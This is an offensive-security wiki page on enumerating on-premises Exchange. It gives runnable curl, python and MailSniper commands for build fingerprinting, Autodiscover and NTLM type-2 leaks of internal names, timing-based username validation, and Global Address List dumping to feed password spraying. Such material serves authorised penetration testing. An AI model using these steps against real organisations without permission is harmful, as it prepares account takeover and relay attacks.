---
title: "Enumeration: build, users, and the address book"
description: "Enumerating on-premises Exchange from outside: reading the build from OWA and ECP static paths, Autodiscover domain and user discovery, timing-based username validation on OWA and EWS, the NTLM type-2 internal-name leak from /rpc and /ews, and dumping the Global Address List."
keywords:
  - Exchange enumeration
  - Autodiscover
  - OWA timing
  - global address list
  - NTLM type-2 leak
---

# Enumeration

Every Client Access endpoint leaks something before authentication. The goal is to come away with three things: the exact **build** (which gates the [RCE chains](rce-chains/index.md)), the internal **AD and host names** (useful for Kerberos and relay targeting), and a real **user list** to spray. All of it is reachable from the internet against `/owa`, `/ecp`, `/autodiscover`, `/ews`, and `/rpc`.

## Fingerprint the build

Read the build before anything else, because it decides which chain applies. OWA serves static assets from a versioned path and the front end stamps its version in headers:

```bash
curl -sk -I 'https://mail.example.com/owa/auth/logon.aspx' | grep -iE 'X-OWA-Version|X-FEServer|X-AspNet'
# /owa/auth/15.2.1544.4/scripts/... -> build 15.2.1544.4 (Exchange 2019)
curl -sk 'https://mail.example.com/owa/auth/logon.aspx' | grep -oE '/owa/auth/[0-9.]+/' | head -1
curl -sk 'https://mail.example.com/ecp/' | grep -oE '/ecp/[0-9.]+/' | head -1
```

`15.0` = 2013, `15.1` = 2016, `15.2` = 2019. Map the full dotted build against Microsoft's build table to see whether it sits below the patch level for a given chain.

## Autodiscover: domain and host discovery

Autodiscover exists so a client that knows only an email address can find its Exchange settings. That makes it a discovery oracle. Both the XML (SOAP) and JSON endpoints answer unauthenticated or single-credential queries and reveal internal URLs, the legacy DN, and the server host:

```bash
# JSON Autodiscover: returns the internal EWS/OAB URLs and server FQDN
curl -sk 'https://mail.example.com/autodiscover/autodiscover.json?Email=john.doe@example.com&Protocol=ActiveSync'

# XML Autodiscover (POST a request body for the address, read the returned settings)
curl -sk -u 'EXAMPLE\john.doe:Password1' -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>john.doe@example.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' \
  'https://mail.example.com/autodiscover/autodiscover.xml'
```

The response `<Server>`, `<ServerDN>`, and the `<Protocol>` URLs give the internal server name, the mailbox legacy-DN format, and the real EWS/OAB endpoints to target later.

## The NTLM type-2 leak: internal names for free

Endpoints that accept Negotiate/NTLM (`/rpc`, `/ews`, `/mapi`, `/autodiscover`) answer an empty NTLM negotiate (type-1) with a type-2 challenge, and that challenge base64 encodes the server's NetBIOS name, DNS computer name, DNS domain, and forest. No credential is needed:

```bash
# Send an NTLM type-1 and decode the type-2 the server returns
curl -sk -I -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=' \
  'https://mail.example.com/rpc/' | grep -i 'WWW-Authenticate: NTLM'
# feed the "NTLM <base64>" value to a decoder:
python3 -c 'import base64,sys;d=base64.b64decode(sys.argv[1]);print([d[i:i+2] for i in range(0,len(d),2)])' '<base64>'
```

Tools such as `nmap -p443 --script http-ntlm-info` or `ntlmrecon` parse the same challenge automatically and print `DNS_Domain_Name`, `DNS_Computer_Name`, and `DNS_Tree_Name`. These are the internal AD domain and the Exchange host FQDN, exactly what you need to build Kerberos SPNs and relay targets.

## Validate users by timing and response

OWA and EWS return measurably different timing or status for a valid versus an invalid username, because a valid user reaches the password check while an invalid one short-circuits. Spray a candidate list of `domain\user` or UPNs and keep the ones whose response time or code diverges:

```powershell
# MailSniper: harvest the internal domain and validate usernames against OWA by timing
Invoke-DomainHarvestOWA -ExchHostname mail.example.com
Invoke-UsernameHarvestOWA -ExchHostname mail.example.com -UserList names.txt `
  -Domain EXAMPLE -OutFile valid_users.txt
```

Interpret the output: `valid_users.txt` holds the names whose timing matched the "password checked" profile. Treat it as a candidate list, not gospel, since network jitter adds noise; confirm the strongest hits with a second pass. A clean valid-user list is what makes the later spray land instead of locking accounts on garbage names.

## Dump the Global Address List

One valid credential turns into the whole organization. The GAL (and the downloadable Offline Address Book) lists every mailbox with its correctly formatted address, which is a far better spray target than any guessed list:

```powershell
# MailSniper: pull the GAL through OWA FindPeople, falling back to EWS
Get-GlobalAddressList -ExchHostname mail.example.com -UserName EXAMPLE\john.doe `
  -Password 'Password1' -OutFile gal.txt
```

`gal.txt` is the real user population in the exact `first.last@example.com` format the org uses. Feed it straight into [spraying](password-spraying.md).

## Exploitation notes

- The build fingerprint is the gate to everything in [RCE chains](rce-chains/index.md); read it first and match the exact dotted build, not just the family.
- The NTLM type-2 leak needs no credential and gives the internal AD domain and Exchange FQDN in one request, which seeds SPN construction for [roasting](../../directory/active-directory/authentication/kerberos/roasting.md) and target selection for [relay](../../directory/active-directory/authentication/ntlm/relay.md).
- Timing enumeration is noisy and jittery; a difference of a few hundred milliseconds that holds across repeats is a valid user, a one-off is noise.
- The GAL harvest is the single highest-value step: it converts one sprayed credential into the complete, correctly-cased user list, sharply raising the next spray's hit rate.

## Tools

- **MailSniper** (`Invoke-DomainHarvestOWA`, `Invoke-UsernameHarvestOWA`, `Get-GlobalAddressList`): domain, user, and GAL harvesting over OWA/EWS.
- **nmap** (`http-ntlm-info`) / **NTLMRecon**: parse the NTLM type-2 challenge for internal names.
- **ruler** (SensePost): Autodiscover and MAPI interaction from Linux.

## References

- [MailSniper (dafthack)](https://github.com/dafthack/MailSniper)
- [SensePost: ruler and Autodiscover](https://github.com/sensepost/ruler)
- [Black Hills InfoSec: attacking Exchange with MailSniper](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)
- [Microsoft: Exchange Server build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates)
